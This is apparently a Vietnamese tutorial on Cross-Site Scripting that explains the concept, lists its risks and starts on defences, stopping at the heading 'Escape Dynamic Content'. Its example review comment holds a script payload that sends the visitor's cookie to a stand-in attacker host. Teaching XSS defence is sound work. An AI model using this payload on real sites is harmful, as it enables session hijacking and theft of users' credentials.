# Cross-Site Scripting
## 1.Khái Niệm
**(XSS) Cross-Site Scripting**: Lỗ hổng XSS cho phép người dùng độc hại thực thi các đoạn JavaScript tùy ý khi người dùng khác truy cập trang web của bạn.
### Ví dụ:
*"Một trang web thương mại điện tử cho phép người dùng gửi nhận xét về các sản phẩm. Trang web này cho phép người dùng nhập một đánh giá và hiển thị nó trên trang sản phẩm tương ứng."*
#
Một kẻ tấn công muốn thực hiện một cuộc tấn công XSS để đánh cắp thông tin đăng nhập của người dùng khi họ truy cập vào trang sản phẩm.
Kẻ tấn công thêm một bình luận chứa mã JavaScript độc hại vào trường đánh giá.
```javascript
<script>
  // Gửi cookie của người dùng đến kẻ tấn công
  var img = new Image();
  img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
```
>Khi một người dùng khác truy cập vào trang sản phẩm và xem bình luận này, mã JavaScript độc hại sẽ được thực thi trên trình duyệt của họ. Điều này sẽ gửi cookie của người dùng đến máy chủ của kẻ tấn công, cho phép họ đánh cắp thông tin đăng nhập của người dùng.
## 2. Nguy Cơ
***Một cuộc tấn công XSS nghiêm túc có thể gây ra những hậu quả nào?***
1. Lây lan các loại mã độc trên các trang mạng xã hội phổ biến như Facebook, Twitter và YouTube.
2. Đánh cắp phiên đăng nhập (session hijacking): Mã JavaScript độc hại có thể gửi ID phiên đến một máy chủ từ xa dưới sự kiểm soát của hacker, cho phép hacker giả mạo người dùng bằng cách chiếm quyền điều khiển phiên đang hoạt động.
3. Đánh cắp danh tính: Thông qua việc người dùng nhập thông tin nhạy cảm như số thẻ tín dụng vào một trang web đã bị chiếm đoạt, các chi tiết này có thể bị đánh cắp bằng JavaScript độc hại.
4. Tấn công từ chối dịch vụ (DoS) và phá hoại trang web: Tấn công DoS để làm gián đoạn hoạt động và gây thiệt hại cho trang web.
5. Đánh cắp dữ liệu nhạy cảm như mật khẩu, đe dọa tài khoản người dùng và có thể dẫn đến các vụ vi phạm bảo mật khác.
6. Tiến hành gian lận tài chính trên các trang web ngân hàng bằng cách khai thác lỗ hổng XSS để thao túng các giao dịch hoặc trích xuất thông tin ngân hàng nhạy cảm.

## 3. Biện pháp bảo vệ
*"Để bảo vệ khỏi các cuộc tấn công XSS được lưu trữ, hãy đảm bảo mọi nội dung động đến từ kho lưu trữ dữ liệu đều không thể được sử dụng để chèn JavaScript vào một trang."*
***Đây là yêu cầu cốt lõi***
### Escape Dynamic Content

